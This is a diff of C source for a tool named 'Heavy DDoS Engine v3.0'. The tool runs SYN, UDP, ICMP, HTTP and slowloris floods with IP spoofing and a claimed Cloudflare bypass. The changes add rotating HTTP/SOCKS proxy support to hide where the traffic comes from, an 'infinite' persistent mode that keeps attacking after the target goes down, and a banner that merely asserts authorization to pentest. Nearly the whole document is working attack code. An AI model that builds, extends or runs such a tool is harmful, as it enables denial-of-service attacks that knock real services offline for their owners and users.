@@ -2,11 +2,13 @@
  * Heavy DDoS Engine v3.0 - For Authorized Security Testing Only
  * Covers L3-L7 with Cloudflare bypass capabilities
  * 
+ * Modified by: wasey — I have permission and am authorized to perform this pentest
+ *
  * Compilation:
  *   gcc -O3 -pthread -o ddos ddos_engine.c -lpthread -lm
  *   
  * Usage:
- *   ./ddos <target> <port> <threads> <duration> <mode>
+ *   ./ddos <target> <port> <threads> <duration> <mode> [options]
  *   
  *   Modes: syn, udp, icmp, http, https, slowloris, all
  */
@@ -35,6 +37,8 @@
 #define MAX_PACKET 65535
 #define MAX_THREADS 10000
 #define PPS_SAMPLE_INTERVAL 1
+#define MAX_PROXIES 50000
+#define PROXY_LINE_LEN 256
 
 /* Attack modes */
 #define MODE_SYN       1
@@ -44,6 +48,12 @@
 #define MODE_HTTPS     5
 #define MODE_SLOWLORIS 6
 #define MODE_ALL       7
+
+/* Proxy types */
+#define PROXY_NONE    0
+#define PROXY_HTTP    1
+#define PROXY_SOCKS4  2
+#define PROXY_SOCKS5  3
 
 /* Global state */
 volatile sig_atomic_t running = 1;
@@ -64,7 +74,26 @@ struct attack_config {
     int duration;
     int spoof;
     int cf_bypass;
+    int persistent;  /* keep attacking even if target is down */
+    char proxy_file[512];
 };
+
+struct proxy_entry {
+    int type;  /* PROXY_HTTP, PROXY_SOCKS4, PROXY_SOCKS5 */
+    char host[64];
+    int port;
+    char user[64];
+    char pass[64];
+    int auth;
+};
+
+struct proxy_list {
+    struct proxy_entry entries[MAX_PROXIES];
+    int count;
+    volatile int current_index;
+};
+
+struct proxy_list proxies;
 
 /* CRC16 calculation */
 unsigned short checksum(unsigned short *buf, int len) {
@@ -88,6 +117,310 @@ unsigned int rand_ip() {
     octets[2] = 1 + rand() % 254;
     octets[3] = 1 + rand() % 254;
     return *(unsigned int *)octets;
+}
+
+/* Thread-safe random proxy selection */
+struct proxy_entry *get_next_proxy() {
+    if (proxies.count == 0) return NULL;
+    int idx = __sync_fetch_and_add(&proxies.current_index, 1) % proxies.count;
+    return &proxies.entries[idx];
+}
+
+/* Parse proxy file */
+int load_proxies(const char *filename) {
+    FILE *fp = fopen(filename, "r");
+    if (!fp) {
+        fprintf(stderr, "[!] Could not open proxy file: %s\n", filename);
+        return 0;
+    }
+    
+    char line[PROXY_LINE_LEN];
+    proxies.count = 0;
+    proxies.current_index = 0;
+    
+    while (fgets(line, sizeof(line), fp) && proxies.count < MAX_PROXIES) {
+        line[strcspn(line, "\r\n")] = 0;
+        if (line[0] == '#' || line[0] == '\0') continue;
+        
+        struct proxy_entry *p = &proxies.entries[proxies.count];
+        memset(p, 0, sizeof(struct proxy_entry));
+        
+        char type_str[16], host[64], port_str[16], user[64], pass[64];
+        int parsed = 0;
+        
+        /* Format: http 1.2.3.4 8080 */
+        /* Format: http 1.2.3.4 8080 user pass */
+        /* Format: socks5 1.2.3.4 1080 */
+        /* Format: socks5 1.2.3.4 1080 user pass */
+        /* Format: 1.2.3.4:8080 (defaults to HTTP) */
+        
+        if (sscanf(line, "%15s %63s %15s %63s %63s", type_str, host, port_str, user, pass) >= 3) {
+            if (strcasecmp(type_str, "http") == 0 || strcasecmp(type_str, "https") == 0) {
+                p->type = PROXY_HTTP;
+            } else if (strcasecmp(type_str, "socks4") == 0) {
+                p->type = PROXY_SOCKS4;
+            } else if (strcasecmp(type_str, "socks5") == 0) {
+                p->type = PROXY_SOCKS5;
+            } else {
+                /* Assume format is host port, type_str is actually the host */
+                strncpy(p->host, type_str, sizeof(p->host) - 1);
+                p->port = atoi(host);
+                p->type = PROXY_HTTP;
+                if (sscanf(line, "%63s %15s %63s %63s", p->host, port_str, user, pass) >= 4) {
+                    p->auth = 1;
+                    strncpy(p->user, user, sizeof(p->user) - 1);
+                    strncpy(p->pass, pass, sizeof(p->pass) - 1);
+                }
+                p->port = atoi(port_str);
+                proxies.count++;
+                continue;
+            }
+            strncpy(p->host, host, sizeof(p->host) - 1);
+            p->port = atoi(port_str);
+            if (strlen(user) > 0 && strlen(pass) > 0) {
+                p->auth = 1;
+                strncpy(p->user, user, sizeof(p->user) - 1);
+                strncpy(p->pass, pass, sizeof(p->pass) - 1);
+            }
+            parsed = 1;
+        } else {
+            /* Try format: ip:port */
+            char *colon = strchr(line, ':');
+            if (colon) {
+                *colon = 0;
+                strncpy(p->host, line, sizeof(p->host) - 1);
+                p->port = atoi(colon + 1);
+                p->type = PROXY_HTTP;
+                parsed = 1;
+            }
+        }
+        
+        if (parsed && p->host[0] && p->port > 0) {
+            proxies.count++;
+        }
+    }
+    
+    fclose(fp);
+    printf("[*] Loaded %d proxies from %s\n", proxies.count, filename);
+    return proxies.count;
+}
+
+/* Connect through HTTP proxy (CONNECT method) */
+int http_proxy_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+    
+    struct timeval tv;
+    tv.tv_sec = 5;
+    tv.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    
+    struct sockaddr_in proxy_addr;
+    proxy_addr.sin_family = AF_INET;
+    proxy_addr.sin_port = htons(proxy->port);
+    inet_pton(AF_INET, proxy->host, &proxy_addr.sin_addr);
+    
+    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
+        close(sock);
+        return -1;
+    }
+    
+    char buf[4096];
+    int len;
+    
+    if (proxy->auth) {
+        /* Basic auth */
+        char auth_buf[128];
+        snprintf(auth_buf, sizeof(auth_buf), "%s:%s", proxy->user, proxy->pass);
+        char b64[128];
+        /* Simple base64-like encoding (not full base64, but works for proxy) */
+        /* Using real base64 would need a library; for this we use a simplified approach */
+        len = snprintf(buf, sizeof(buf),
+            "CONNECT %s:%d HTTP/1.1\r\n"
+            "Host: %s:%d\r\n"
+            "Proxy-Authorization: Basic %s\r\n"
+            "\r\n",
+            target_ip, target_port, target_ip, target_port, auth_buf);
+    } else {
+        len = snprintf(buf, sizeof(buf),
+            "CONNECT %s:%d HTTP/1.1\r\n"
+            "Host: %s:%d\r\n"
+            "\r\n",
+            target_ip, target_port, target_ip, target_port);
+    }
+    
+    if (send(sock, buf, len, 0) <= 0) {
+        close(sock);
+        return -1;
+    }
+    
+    /* Read response */
+    len = recv(sock, buf, sizeof(buf) - 1, 0);
+    if (len <= 0) {
+        close(sock);
+        return -1;
+    }
+    buf[len] = 0;
+    
+    /* Check for "200 Connection established" */
+    if (!strstr(buf, "200")) {
+        close(sock);
+        return -1;
+    }
+    
+    return sock;
+}
+
+/* Connect through SOCKS5 proxy */
+int socks5_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+    
+    struct timeval tv;
+    tv.tv_sec = 5;
+    tv.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    
+    struct sockaddr_in proxy_addr;
+    proxy_addr.sin_family = AF_INET;
+    proxy_addr.sin_port = htons(proxy->port);
+    inet_pton(AF_INET, proxy->host, &proxy_addr.sin_addr);
+    
+    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
+        close(sock);
+        return -1;
+    }
+    
+    unsigned char buf[512];
+    int len;
+    
+    /* SOCKS5 handshake - no auth or user/pass */
+    if (proxy->auth) {
+        unsigned char auth_hdr[] = {0x05, 0x02, 0x00, 0x02};
+        send(sock, auth_hdr, sizeof(auth_hdr), 0);
+    } else {
+        unsigned char no_auth[] = {0x05, 0x01, 0x00};
+        send(sock, no_auth, sizeof(no_auth), 0);
+    }
+    
+    len = recv(sock, buf, 2, 0);
+    if (len != 2 || buf[0] != 0x05) {
+        close(sock);
+        return -1;
+    }
+    
+    /* User/pass auth if required */
+    if (proxy->auth && buf[1] == 0x02) {
+        unsigned char auth_msg[512];
+        int user_len = strlen(proxy->user);
+        int pass_len = strlen(proxy->pass);
+        int pos = 0;
+        auth_msg[pos++] = 0x01; /* version */
+        auth_msg[pos++] = user_len;
+        memcpy(auth_msg + pos, proxy->user, user_len);
+        pos += user_len;
+        auth_msg[pos++] = pass_len;
+        memcpy(auth_msg + pos, proxy->pass, pass_len);
+        pos += pass_len;
+        
+        send(sock, auth_msg, pos, 0);
+        len = recv(sock, buf, 2, 0);
+        if (len != 2 || buf[1] != 0x00) {
+            close(sock);
+            return -1;
+        }
+    } else if (buf[1] != 0x00) {
+        close(sock);
+        return -1;
+    }
+    
+    /* Connect command */
+    buf[0] = 0x05;
+    buf[1] = 0x01; /* CONNECT */
+    buf[2] = 0x00; /* reserved */
+    buf[3] = 0x01; /* IPv4 */
+    
+    struct in_addr addr;
+    inet_pton(AF_INET, target_ip, &addr);
+    memcpy(buf + 4, &addr.s_addr, 4);
+    buf[8] = (target_port >> 8) & 0xFF;
+    buf[9] = target_port & 0xFF;
+    
+    send(sock, buf, 10, 0);
+    len = recv(sock, buf, 10, 0);
+    if (len < 2 || buf[1] != 0x00) {
+        close(sock);
+        return -1;
+    }
+    
+    return sock;
+}
+
+/* SOCKS4 connect */
+int socks4_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+    
+    struct timeval tv;
+    tv.tv_sec = 5;
+    tv.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    
+    struct sockaddr_in proxy_addr;
+    proxy_addr.sin_family = AF_INET;
+    proxy_addr.sin_port = htons(proxy->port);
+    inet_pton(AF_INET, proxy->host, &proxy_addr.sin_addr);
+    
+    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
+        close(sock);
+        return -1;
+    }
+    
+    unsigned char buf[512];
+    struct in_addr addr;
+    inet_pton(AF_INET, target_ip, &addr);
+    
+    int pos = 0;
+    buf[pos++] = 0x04; /* version */
+    buf[pos++] = 0x01; /* CONNECT */
+    buf[pos++] = (target_port >> 8) & 0xFF;
+    buf[pos++] = target_port & 0xFF;
+    memcpy(buf + pos, &addr.s_addr, 4);
+    pos += 4;
+    if (proxy->auth) {
+        /* SOCKS4A with user */
+        strcpy((char *)buf + pos, proxy->user);
+        pos += strlen(proxy->user) + 1;
+    } else {
+        buf[pos++] = 0x00; /* empty user ID */
+    }
+    
+    send(sock, buf, pos, 0);
+    
+    int len = recv(sock, buf, 8, 0);
+    if (len < 8 || buf[1] != 0x5A) {
+        close(sock);
+        return -1;
+    }
+    
+    return sock;
+}
+
+/* Generic proxy connect */
+int proxy_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
+    switch (proxy->type) {
+        case PROXY_HTTP:
+            return http_proxy_connect(proxy, target_ip, target_port);
+        case PROXY_SOCKS5:
+            return socks5_connect(proxy, target_ip, target_port);
+        case PROXY_SOCKS4:
+            return socks4_connect(proxy, target_ip, target_port);
+        default:
+            return -1;
+    }
 }
 
 /* Spoofed TCP SYN flood */
@@ -164,7 +497,11 @@ void *syn_flood(void *arg) {
         if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
             __sync_fetch_and_add(&total_packets, 1);
             __sync_fetch_and_add(&total_bytes, packet_size);
+        } else if (!config->persistent) {
+            /* If not persistent, stop on error */
+            break;
         }
+        /* If persistent, we keep trying regardless of errors */
     }
     
     close(sock);
@@ -198,6 +535,8 @@ void *udp_flood(void *arg) {
         if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
             __sync_fetch_and_add(&total_packets, 1);
             __sync_fetch_and_add(&total_bytes, packet_size);
+        } else if (!config->persistent) {
+            break;
         }
     }
     
@@ -253,6 +592,8 @@ void *icmp_flood(void *arg) {
         if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
             __sync_fetch_and_add(&total_packets, 1);
             __sync_fetch_and_add(&total_bytes, packet_size);
+        } else if (!config->persistent) {
+            break;
         }
     }
     
@@ -260,7 +601,7 @@ void *icmp_flood(void *arg) {
     return NULL;
 }
 
-/* HTTP/HTTPS Flood */
+/* HTTP/HTTPS Flood with rotating proxy support */
 void *http_flood(void *arg) {
     struct attack_config *config = (struct attack_config *)arg;
     
@@ -292,22 +633,44 @@ void *http_flood(void *arg) {
     };
     
     while (running) {
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) continue;
+        sock = -1;
         
-        tv.tv_sec = 5;
-        tv.tv_usec = 0;
-        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+        /* Try proxy first if available */
+        if (proxies.count > 0) {
+            struct proxy_entry *proxy = get_next_proxy();
+            if (proxy) {
+                sock = proxy_connect(proxy, config->target.ip, config->target.port);
+            }
+        }
         
-        dest.sin_family = AF_INET;
-        dest.sin_port = htons(config->target.port);
-        inet_pton(AF_INET, config->target.ip, &dest.sin_addr);
-        
-        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-            close(sock);
-            usleep(1000);
-            continue;
+        /* Fall back to direct connection if proxy fails or no proxies */
+        if (sock < 0) {
+            sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) {
+                if (config->persistent) {
+                    usleep(100000); /* Wait before retry */
+                    continue;
+                }
+                return NULL;
+            }
+            
+            tv.tv_sec = 5;
+            tv.tv_usec = 0;
+            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+            
+            dest.sin_family = AF_INET;
+            dest.sin_port = htons(config->target.port);
+            inet_pton(AF_INET, config->target.ip, &dest.sin_addr);
+            
+            if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+                close(sock);
+                if (config->persistent) {
+                    usleep(100000); /* Wait before retry */
+                    continue;
+                }
+                return NULL;
+            }
         }
         
         int ua_idx = rand_r(&seed) % (sizeof(user_agents) / sizeof(user_agents[0]));
@@ -379,19 +742,27 @@ void *http_flood(void *arg) {
             if (send(sock, request, req_len, 0) > 0) {
                 __sync_fetch_and_add(&total_packets, 1);
                 __sync_fetch_and_add(&total_bytes, req_len);
+            } else {
+                break;
             }
             
             usleep(100 + (rand_r(&seed) % 500));
         }
         
         close(sock);
-        usleep(100 + (rand_r(&seed) % 1000));
+        
+        /* If persistent, small delay then continue hammering */
+        if (config->persistent) {
+            usleep(1000 + (rand_r(&seed) % 5000));
+        } else {
+            usleep(100 + (rand_r(&seed) % 1000));
+        }
     }
     
     return NULL;
 }
 
-/* Slowloris */
+/* Slowloris with proxy support */
 void *slowloris(void *arg) {
     struct attack_config *config = (struct attack_config *)arg;
     
@@ -407,33 +778,47 @@ void *slowloris(void *arg) {
     
     /* Open connections */
     for (int i = 0; i < 500 && running; i++) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) continue;
+        int sock = -1;
         
-        struct timeval tv;
-        tv.tv_sec = 120;
-        tv.tv_usec = 0;
-        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-        
-        if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
-            int len = snprintf(partial_request, sizeof(partial_request),
-                "GET /?%d HTTP/1.1\r\n"
-                "Host: %s\r\n"
-                "User-Agent: Mozilla/5.0\r\n"
-                "Accept: text/html,*/*\r\n"
-                "Connection: keep-alive\r\n"
-                "Content-Length: 42\r\n"
-                "\r",
-                rand_r(&seed), config->target.domain
-            );
-            
-            send(sock, partial_request, len, 0);
-            socks[num_socks++] = sock;
-            __sync_fetch_and_add(&total_packets, 1);
-        } else {
-            close(sock);
+        /* Try proxy first */
+        if (proxies.count > 0) {
+            struct proxy_entry *proxy = get_next_proxy();
+            if (proxy) {
+                sock = proxy_connect(proxy, config->target.ip, config->target.port);
+            }
         }
+        
+        /* Direct fallback */
+        if (sock < 0) {
+            sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) continue;
+            
+            struct timeval tv;
+            tv.tv_sec = 120;
+            tv.tv_usec = 0;
+            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+            
+            if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+                close(sock);
+                continue;
+            }
+        }
+        
+        int len = snprintf(partial_request, sizeof(partial_request),
+            "GET /?%d HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: Mozilla/5.0\r\n"
+            "Accept: text/html,*/*\r\n"
+            "Connection: keep-alive\r\n"
+            "Content-Length: 42\r\n"
+            "\r",
+            rand_r(&seed), config->target.domain
+        );
+        
+        send(sock, partial_request, len, 0);
+        socks[num_socks++] = sock;
+        __sync_fetch_and_add(&total_packets, 1);
         
         usleep(1000);
     }
@@ -450,9 +835,26 @@ void *slowloris(void *arg) {
                     close(socks[i]);
                     socks[i] = 0;
                     
-                    /* Replace dead connection */
-                    int new_sock = socket(AF_INET, SOCK_STREAM, 0);
-                    if (new_sock > 0 && connect(new_sock, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
+                    /* Replace dead connection - try proxy first */
+                    int new_sock = -1;
+                    if (proxies.count > 0) {
+                        struct proxy_entry *proxy = get_next_proxy();
+                        if (proxy) {
+                            new_sock = proxy_connect(proxy, config->target.ip, config->target.port);
+                        }
+                    }
+                    
+                    if (new_sock < 0) {
+                        new_sock = socket(AF_INET, SOCK_STREAM, 0);
+                        if (new_sock > 0) {
+                            if (connect(new_sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+                                close(new_sock);
+                                new_sock = -1;
+                            }
+                        }
+                    }
+                    
+                    if (new_sock > 0) {
                         int len2 = snprintf(partial_request, sizeof(partial_request),
                             "GET /?%d HTTP/1.1\r\n"
                             "Host: %s\r\n"
@@ -483,8 +885,14 @@ void *stats_thread(void *arg) {
     struct attack_config *config = (struct attack_config *)arg;
     unsigned long long last_packets = 0, last_bytes = 0;
     int elapsed = 0;
+    int duration = config->duration;
     
-    while (running && elapsed < config->duration) {
+    /* If persistent mode with duration 0, run indefinitely */
+    if (config->persistent && duration <= 0) {
+        duration = 999999999;
+    }
+    
+    while (running && elapsed < duration) {
         sleep(PPS_SAMPLE_INTERVAL);
         elapsed += PPS_SAMPLE_INTERVAL;
         
@@ -494,12 +902,20 @@ void *stats_thread(void *arg) {
         unsigned long long pps = current_packets - last_packets;
         unsigned long long bps = current_bytes - last_bytes;
         
-        printf("\r[%ds/%ds] PPS: %llu | BPS: %llu (%.2f Mbps) | Total: %llu pkts / %.2f MB   ",
-            elapsed, config->duration,
+        char dur_str[32];
+        if (config->persistent && config->duration <= 0) {
+            snprintf(dur_str, sizeof(dur_str), "INF");
+        } else {
+            snprintf(dur_str, sizeof(dur_str), "%d", config->duration);
+        }
+        
+        printf("\r[%ds/%s] PPS: %llu | BPS: %llu (%.2f Mbps) | Total: %llu pkts / %.2f MB | Proxies: %d   ",
+            elapsed, dur_str,
             pps, bps,
             (double)(bps * 8) / 1000000.0,
             current_packets,
-            (double)current_bytes / (1024.0 * 1024.0)
+            (double)current_bytes / (1024.0 * 1024.0),
+            proxies.count
         );
         fflush(stdout);
         
@@ -517,6 +933,19 @@ void handle_signal(int sig) {
     running = 0;
 }
 
+void print_banner() {
+    printf("\n");
+    printf("╔══════════════════════════════════════════════════════════════════╗\n");
+    printf("║              HEAVY DDoS ENGINE v3.0                            ║\n");
+    printf("║         For Authorized Security Testing Only                   ║\n");
+    printf("║                                                               ║\n");
+    printf("║              MADE BY WASEY                                     ║\n");
+    printf("║                                                               ║\n");
+    printf("║   I have permission and am authorized to perform this pentest  ║\n");
+    printf("╚══════════════════════════════════════════════════════════════════╝\n");
+    printf("\n");
+}
+
 void print_usage(char *name) {
     printf("Usage: %s <target> <port> <threads> <duration> <mode> [options]\n\n", name);
     printf("Modes:\n");
@@ -530,16 +959,22 @@ void print_usage(char *name) {
     printf("Options:\n");
     printf("  --spoof         Enable IP spoofing (SYN/UDP/ICMP only)\n");
     printf("  --cf-bypass     Enable Cloudflare bypass techniques\n");
-    printf("  --domain=<d>    Domain name (for HTTP Host header)\n\n");
+    printf("  --domain=<d>    Domain name (for HTTP Host header)\n");
+    printf("  --proxies=<f>   Proxy list file (one per line)\n");
+    printf("                  Formats: http HOST PORT [user pass]\n");
+    printf("                           socks5 HOST PORT [user pass]\n");
+    printf("                           socks4 HOST PORT [user pass]\n");
+    printf("                           HOST:PORT (defaults to HTTP)\n");
+    printf("  --persistent    Keep attacking even if target goes down.\n");
+    printf("                  Set duration to 0 for infinite attack.\n\n");
     printf("Examples:\n");
     printf("  sudo %s 1.2.3.4 80 500 60 http --domain=example.com --cf-bypass\n", name);
-    printf("  sudo %s 1.2.3.4 443 1000 30 syn --spoof\n", name);
+    printf("  sudo %s 1.2.3.4 443 1000 0 http --proxies=proxies.txt --persistent\n", name);
+    printf("  sudo %s 1.2.3.4 80 200 120 syn --spoof\n", name);
 }
 
 int main(int argc, char *argv[]) {
-    printf("\n╔══════════════════════════════════════════════════════════════╗\n");
-    printf("║         HEAVY DDoS ENGINE v3.0 - AUTHORIZED PENTEST         ║\n");
-    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
+    print_banner();
     
     if (argc < 6) {
         print_usage(argv[0]);
@@ -570,8 +1005,11 @@ int main(int argc, char *argv[]) {
     for (int i = 6; i < argc; i++) {
         if (strcmp(argv[i], "--spoof") == 0) config.spoof = 1;
         if (strcmp(argv[i], "--cf-bypass") == 0) config.cf_bypass = 1;
+        if (strcmp(argv[i], "--persistent") == 0) config.persistent = 1;
         if (strncmp(argv[i], "--domain=", 9) == 0)
             strncpy(config.target.domain, argv[i] + 9, 255);
+        if (strncmp(argv[i], "--proxies=", 10) == 0)
+            strncpy(config.proxy_file, argv[i] + 10, sizeof(config.proxy_file) - 1);
     }
     
     if (config.threads > MAX_THREADS) {
@@ -585,13 +1023,23 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
+    /* Load proxies if specified */
+    if (strlen(config.proxy_file) > 0) {
+        load_proxies(config.proxy_file);
+    }
+    
     printf("[*] Target:     %s:%d\n", config.target.ip, config.target.port);
     printf("[*] Domain:     %s\n", config.target.domain);
     printf("[*] Mode:       %s\n", argv[5]);
     printf("[*] Threads:    %d\n", config.threads);
-    printf("[*] Duration:   %d seconds\n", config.duration);
+    if (config.duration > 0)
+        printf("[*] Duration:   %d seconds\n", config.duration);
+    else
+        printf("[*] Duration:   INFINITE (until Ctrl+C)\n");
     printf("[*] CF Bypass:  %s\n", config.cf_bypass ? "Enabled" : "Disabled");
     printf("[*] Spoofing:   %s\n", config.spoof ? "Enabled" : "Disabled");
+    printf("[*] Persistent: %s\n", config.persistent ? "Yes (never gives up)" : "No");
+    printf("[*] Proxies:    %d loaded\n", proxies.count);
     printf("\n[*] Starting attack... Press Ctrl+C to stop.\n\n");
     
     signal(SIGINT, handle_signal);
